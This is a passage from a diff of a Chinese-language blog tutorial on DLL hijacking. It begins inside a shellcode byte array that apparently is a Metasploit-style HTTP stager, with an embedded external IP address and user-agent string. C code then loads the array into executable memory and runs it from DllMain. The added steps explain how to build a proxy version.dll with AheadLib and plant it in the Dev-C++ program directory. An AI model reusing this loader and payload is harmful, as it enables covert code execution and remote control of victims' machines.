\x31\xc9\x41\x50\x41\x50\x41\xba\x3a\x56\x79\xa7\xff\xd5\xeb\x73\x5a\x48\x89\xc1\x41\xb8\x52\x00\x00\x00\x4d\x31\xc9\x41\x51\x41\x51\x6a\x03\x41\x51\x41\xba\x57\x89\x9f\xc6\xff\xd5\xeb\x59\x5b\x48\x89\xc1\x48\x31\xd2\x49\x89\xd8\x4d\x31\xc9\x52\x68\x00\x02\x40\x84\x52\x52\x41\xba\xeb\x55\x2e\x3b\xff\xd5\x48\x89\xc6\x48\x83\xc3\x50\x6a\x0a\x5f\x48\x89\xf1\x48\x89\xda\x49\xc7\xc0\xff\xff\xff\xff\x4d\x31\xc9\x52\x52\x41\xba\x2d\x06\x18\x7b\xff\xd5\x85\xc0\x0f\x85\x9d\x01\x00\x00\x48\xff\xcf\x0f\x84\x8c\x01\x00\x00\xeb\xd3\xe9\xe4\x01\x00\x00\xe8\xa2\xff\xff\xff\x2f\x32\x73\x49\x6f\x00\x31\x4d\x45\xe6\x0d\x76\x8c\xf4\x00\x02\x49\x45\x0f\x27\x5c\xf5\x6f\xa5\xcf\xc4\x32\xfb\x71\x38\x94\xa9\xfd\x2e\xc9\xbf\xec\x02\x37\x55\x4d\x3f\xe5\x53\xef\xb1\x9b\x4e\x09\x96\xf0\x6a\x58\x12\x66\x49\x0d\xc9\x64\x84\x81\xc3\xa2\x10\x88\x93\xd4\x16\xd8\x78\xeb\x57\x6c\xd8\xe4\xeb\xd4\x37\xdc\x00\x55\x73\x65\x72\x2d\x41\x67\x65\x6e\x74\x3a\x20\x4d\x6f\x7a\x69\x6c\x6c\x61\x2f\x35\x2e\x30\x20\x28\x63\x6f\x6d\x70\x61\x74\x69\x62\x6c\x65\x3b\x20\x4d\x53\x49\x45\x20\x31\x30\x2e\x30\x3b\x20\x57\x69\x6e\x64\x6f\x77\x73\x20\x4e\x54\x20\x36\x2e\x32\x3b\x20\x57\x4f\x57\x36\x34\x3b\x20\x54\x72\x69\x64\x65\x6e\x74\x2f\x36\x2e\x30\x3b\x20\x42\x4f\x49\x45\x39\x3b\x45\x4e\x55\x53\x29\x0d\x0a\x00\xc8\xdb\x71\xc1\x22\xaa\x39\xe6\x45\x49\x5c\xed\x8e\x07\xee\x03\xe4\x44\x0b\xa5\x97\xb0\xd5\xa7\x70\x9b\x1b\xb0\x67\xc4\x6b\x7c\x67\x10\x9e\xd7\x68\x09\xfb\x58\xf0\x5a\xe1\x01\x07\x6d\x03\x42\x00\x95\x65\x33\x39\x85\xf2\x17\x32\xa1\xf9\xd7\x38\x1e\x95\xb7\x6a\x61\x05\x4e\x0f\x46\x29\x70\xdd\x52\xfa\xd4\xb7\x4d\xdd\x1d\x99\xce\x00\x39\x21\x25\xf9\x92\xe0\x35\xe7\xfc\x29\xe0\xb6\xdb\x21\x05\x84\x71\x2e\xb9\x63\x6e\x14\xb6\x36\xe4\xaa\xbf\xe5\x39\x04\x6c\xb6\xe7\xce\xf5\xec\xac\x0c\x22\xe4\xdf\x86\xbe\x70\x31\x21\x4e\x20\x5d\xc8\x77\xd6\xfc\x14\xda\x5a\x4a\x14\xc1\x5f\x37\x2f\xf9\x1a\x96\x07\x41\x98\xd2\x08\x4e\xfc\xca\xf7\xb0\x48\x69\xa3\xe1\x34\x04\x07\x54\xf5\xe2\x62\xc0\x04\x70\xb4\x65\x4b\xaf\xe3\x4e\x15\x11\x1b\x0a\x86\x38\x64\x8a\x9d\xb2\x69\xe7\x7f\x09\x33\xcd\x9c\x07\x92\x66\x28\xef\xf8\x24\xbf\x06\x68\x00\x41\xbe\xf0\xb5\xa2\x56\xff\xd5\x48\x31\xc9\xba\x00\x00\x40\x00\x41\xb8\x00\x10\x00\x00\x41\xb9\x40\x00\x00\x00\x41\xba\x58\xa4\x53\xe5\xff\xd5\x48\x93\x53\x53\x48\x89\xe7\x48\x89\xf1\x48\x89\xda\x41\xb8\x00\x20\x00\x00\x49\x89\xf9\x41\xba\x12\x96\x89\xe2\xff\xd5\x48\x83\xc4\x20\x85\xc0\x74\xb6\x66\x8b\x07\x48\x01\xc3\x85\xc0\x75\xd7\x58\x58\x58\x48\x05\x00\x00\x00\x00\x50\xc3\xe8\x9f\xfd\xff\xff\x31\x30\x31\x2e\x33\x34\x2e\x31\x38\x37\x2e\x32\x32\x33\x00\x00\x0a\x2c\x2a&quot;</span>;<br><br>        <span class="hljs-keyword">void</span>* exec = VirtualAlloc(<span class="hljs-number">0</span>, sizeof(buf), MEM_COMMIT, PAGE_EXECUTE_READWRITE);<br>        memcpy(exec, buf, sizeof(buf));<br>        CreateThread(<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, (LPTHREAD_START_ROUTINE)exec, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>);<br>    &#125;;<br><br>    <span class="hljs-keyword">case</span> DLL_THREAD_ATTACH:<br>    <span class="hljs-keyword">case</span> DLL_THREAD_DETACH:<br>    <span class="hljs-keyword">case</span> DLL_PROCESS_DETACH:<br>        <span class="hljs-keyword">break</span>;<br>    &#125;<br>    <span class="hljs-keyword">return</span> TRUE;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p><img src="/2023/10/12/DLL%E6%8C%9F%E6%8C%81%E5%88%86%E4%BA%AB%20e50a3a78977c4461b7e199951ad744b0/Untitled%2015.png" srcset="/img/loading.gif" lazyload alt="Untitled"></p>
+<h2 id="2、找存在的dll"><a href="#2、找存在的dll" class="headerlink" title="2、找存在的dll"></a>2、找存在的dll</h2><p>这里推荐一款工具</p>
+<p>AheadLib.exe</p>
+<p>在devcpp中的version.dll中并没有发现其有loadlibrary函数，但是这个函数存在且不再被保护的名单当中。</p>
+<p><img src="/2023/10/12/DLL%E6%8C%9F%E6%8C%81%E5%88%86%E4%BA%AB%20e50a3a78977c4461b7e199951ad744b0/Untitled%2016.png" srcset="/img/loading.gif" lazyload alt="Untitled"></p>
+<p>copy dll文件到桌面打开该文件</p>
+<p>直接点击生成</p>
+<p><img src="/2023/10/12/DLL%E6%8C%9F%E6%8C%81%E5%88%86%E4%BA%AB%20e50a3a78977c4461b7e199951ad744b0/Untitled%2017.png" srcset="/img/loading.gif" lazyload alt="Untitled"></p>
+<p>会生成一个cpp文件</p>
+<p>cpp文件直接用vs编译</p>
+<p>头文件添加 pch.h  （一定要加在最上面不然会有莫名其妙的错误）</p>
+<p>stdlib.h （这个是用来使用system函数）</p>
+<p><img src="/2023/10/12/DLL%E6%8C%9F%E6%8C%81%E5%88%86%E4%BA%AB%20e50a3a78977c4461b7e199951ad744b0/Untitled%2018.png" srcset="/img/loading.gif" lazyload alt="Untitled"></p>
+<p>在main函数中添加调用计算机的命令</p>
+<p><img src="/2023/10/12/DLL%E6%8C%9F%E6%8C%81%E5%88%86%E4%BA%AB%20e50a3a78977c4461b7e199951ad744b0/Untitled%2019.png" srcset="/img/loading.gif" lazyload alt="Untitled"></p>
+<p>将文件重命名为version.dll</p>
+<p><img src="/2023/10/12/DLL%E6%8C%9F%E6%8C%81%E5%88%86%E4%BA%AB%20e50a3a78977c4461b7e199951ad744b0/Untitled%2020.png" srcset="/img/loading.gif" lazyload alt="Untitled"></p>
+<p>直接放到devcpp的启动目录即可</p>
+<p><img src="/2023/10/12/DLL%E6%8C%9F%E6%8C%81%E5%88%86%E4%BA%AB%20e50a3a78977c4461b7e199951ad744b0/Untitled%2021.png" srcset="/img/loading.gif" lazyload alt="Untitled"></p>
+<h1 id="7-DLL挟持上线msf"><a href="#7-DLL挟持上线msf" class="headerlink" title="7 DLL挟持上线msf"></a>7 DLL挟持上线msf</h1>
                 
               </div>
             
@@ -366,7 +421,7 @@
   <div class="license-box my-3">
     <div class="license-title">
       <div>DLL挟持</div>
-      <div>http://example.com/2023/10/11/DLL挟持分享 e50a3a78977c4461b7e199951ad744b0/</div>
+      <div>http://example.com/2023/10/12/DLL挟持分享 e50a3a78977c4461b7e199951ad744b0/</div>
     </div>
     <div class="license-meta">
       
@@ -378,7 +433,7 @@
       
         <div class="license-meta-item license-meta-date">
           <div>发布于</div>
-          <div>2023年10月11日</div>
+          <div>2023年10月12日</div>
         </div>
       
       
